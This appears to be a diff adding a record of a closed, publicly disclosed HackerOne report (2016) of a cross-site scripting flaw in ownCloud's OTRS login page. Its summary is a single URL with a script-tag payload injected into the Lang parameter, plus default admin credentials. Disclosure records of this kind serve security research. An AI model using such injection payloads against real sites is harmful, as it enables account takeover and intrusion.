@@ -1,0 +1,12 @@
+ReportLink:https://hackerone.com/reports/108288
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/arover7
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:10.02.2016 15:44:27
+
+Summary:
+
+https://otrs.owncloud.com/otrs/index.pl?Action=Login&RequestedURL=&Lang=rue6587"><script>alert(1)<%2fscript>60730d78bc6&TimeOffset=-300&User=admin&Password=admin
